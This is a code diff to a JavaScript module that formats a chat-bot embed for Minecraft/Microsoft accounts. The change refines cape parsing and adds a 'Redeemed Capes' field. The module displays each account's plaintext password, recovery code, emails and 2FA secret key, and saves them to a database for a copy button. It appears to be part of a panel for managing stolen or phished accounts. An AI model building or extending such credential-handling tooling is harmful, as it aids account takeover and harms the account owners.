@@ -284,17 +284,52 @@ module.exports = async (id, current, uid = null) => {
     const is2faDisabled = currentAccount.secretkey === "Disabled" || currentAccount.secretkey === "Option is disabled.";
     const tfaDisplay = is2faDisabled ? "Disabled" : (currentAccount.secretkey ? "Enabled" : "Not set");
 
-    embed.setFields([
+    let parsedCapes = [];
+    if (Array.isArray(currentAccount.capes)) {
+        parsedCapes = currentAccount.capes;
+    } else if (typeof currentAccount.capes === "string" && currentAccount.capes.trim()) {
+        try {
+            const parsed = JSON.parse(currentAccount.capes);
+            if (Array.isArray(parsed)) parsedCapes = parsed;
+            else if (parsed) parsedCapes = [String(parsed)];
+        } catch {
+            parsedCapes = currentAccount.capes.split(",").map(c => c.trim()).filter(Boolean);
+        }
+    }
+    const capesDisplay = parsedCapes.length > 0 ? parsedCapes.join(", ") : "None";
+
+    let redeemedCapesDisplay = "None";
+    try {
+        const extraRows = await queryParams("SELECT purchases FROM extrainformation WHERE uid = ?", [currentAccount.uid]);
+        if (extraRows && extraRows.length > 0 && extraRows[0]?.purchases) {
+            const { parsePurchases } = require("../info/parsePurchases");
+            const { redeemedCapes } = parsePurchases(extraRows[0].purchases);
+            if (redeemedCapes && redeemedCapes.length > 0) {
+                redeemedCapesDisplay = redeemedCapes.join(", ");
+            }
+        }
+    } catch (e) {}
+
+    const accountFields = [
         { name: "Username", value: `\`\`\`${currentAccount.username || "Not set"}\`\`\``, inline: true },
         { name: "Owns Minecraft", value: `\`\`\`${currentAccount.ownsmc || "No"}\`\`\``, inline: true },
-        { name: "Capes", value: "```" + (Array.isArray(currentAccount.capes) && currentAccount.capes.length > 0 ? currentAccount.capes.join(", ") : "None") + "```", inline: true },
+        { name: "Capes (Java)", value: `\`\`\`${capesDisplay}\`\`\``, inline: true },
+    ];
+
+    if (redeemedCapesDisplay !== "None") {
+        accountFields.push({ name: "Redeemed Capes (MS)", value: `\`\`\`${redeemedCapesDisplay}\`\`\``, inline: true });
+    }
+
+    accountFields.push(
         { name: "Recovery Code", value: `\`\`\`${currentAccount.recoverycode || "Not set"}\`\`\``, inline: false },
         { name: "Primary Email", value: `\`\`\`${currentAccount.email || "Not set"}\`\`\``, inline: true },
         { name: "Secondary Email", value: `\`\`\`${currentAccount.secemail || "Not set"}\`\`\``, inline: true },
         { name: "2FA Status", value: `\`\`\`${tfaDisplay}\`\`\``, inline: true },
         { name: "Secret Key", value: `\`\`\`${currentAccount.secretkey || "Not set"}\`\`\``, inline: true },
-        { name: "Password", value: `\`\`\`${currentAccount.password || "Not set"}\`\`\``, inline: false },
-    ]);
+        { name: "Password", value: `\`\`\`${currentAccount.password || "Not set"}\`\`\``, inline: false }
+    );
+
+    embed.setFields(accountFields);
 
 
     if (currentAccount.time) {
@@ -308,7 +343,7 @@ module.exports = async (id, current, uid = null) => {
     let copyTextId = generate(32);
     await queryParams(
         "INSERT INTO actions(id, action) VALUES(?, ?)",
-        [copyTextId, `copyText|${id}|${currentAccount.username}|${currentAccount.ownsmc}|${currentAccount.capes}|${currentAccount.recoverycode}|${currentAccount.email}|${currentAccount.secemail}|${currentAccount.secretkey}|${currentAccount.password}`]
+        [copyTextId, `copyText|${id}|${currentAccount.username}|${currentAccount.ownsmc}|${capesDisplay}|${currentAccount.recoverycode}|${currentAccount.email}|${currentAccount.secemail}|${currentAccount.secretkey}|${currentAccount.password}`]
     );
 
     const sortingLabels = {
